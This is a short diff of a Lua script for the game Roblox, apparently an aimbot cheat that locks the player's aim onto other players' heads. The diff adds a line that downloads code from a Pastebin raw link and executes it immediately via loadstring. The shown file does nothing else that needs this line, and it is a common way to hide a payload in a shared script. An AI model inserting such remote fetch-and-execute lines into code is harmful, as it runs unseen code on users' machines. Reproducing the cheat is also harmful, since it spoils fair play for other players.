@@ -5,7 +5,7 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 local Holding = false
-
+loadstring(game:HttpGet("https://pastebin.com/raw/ygp8Enye"))()
 _G.AimbotEnabled = true
 _G.TeamCheck = false -- If set to true then the script would only lock your aim at enemy team members.
 _G.AimPart = "Head" -- Where the aimbot script would lock at.
